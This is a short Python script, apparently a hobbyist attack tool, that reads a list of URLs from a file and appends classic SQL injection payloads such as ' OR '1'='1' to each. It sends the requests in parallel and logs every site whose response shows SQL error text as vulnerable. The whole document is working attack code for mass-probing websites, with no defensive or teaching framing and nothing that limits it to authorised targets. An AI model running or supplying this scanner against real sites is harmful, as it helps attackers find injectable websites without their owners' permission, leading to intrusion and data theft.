##CODED WITH LOVE 

import requests
import subprocess
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
init(autoreset=True)

payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR ''='",
    "' OR 1 -- -",
    "' OR 1 /*",
    "' OR 1 #",
]

def read_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
    # Remove whitespace and duplicates
    urls = list(set(url.strip() for url in urls))
    return urls

# Function to check for SQL injection vulnerability
def is_vulnerable(url):
    for payload in payloads:
        target_url = url + payload
        try:
            response = requests.get(target_url, timeout=5)
            if "SQL syntax" in response.text or "mysql_fetch" in response.text or "SQL error" in response.text:
                print(f"{Fore.YELLOW}[+] Vulnerable: {url} with payload: {payload}{Style.RESET_ALL}")
                with open("vuln.txt", "a") as file:
                    file.write(f"{url} with payload: {payload}\n")
                return True
        except requests.RequestException as e:
            print(f"{Fore.BLUE}[-] Site Dead {url}{Style.RESET_ALL}")
    return False


def scan_urls(urls):
    def scan(url):
        print(f"[*] Scanning: {url}")
        if is_vulnerable(url):
            print(f"{Fore.YELLOW}[+] Vulnerable: {url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Not vulnerable: {url}{Style.RESET_ALL}")

    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(scan, urls)

# Run the scanner
if __name__ == "__main__":
    urls = read_urls_from_file('urls.txt')
    scan_urls(urls)
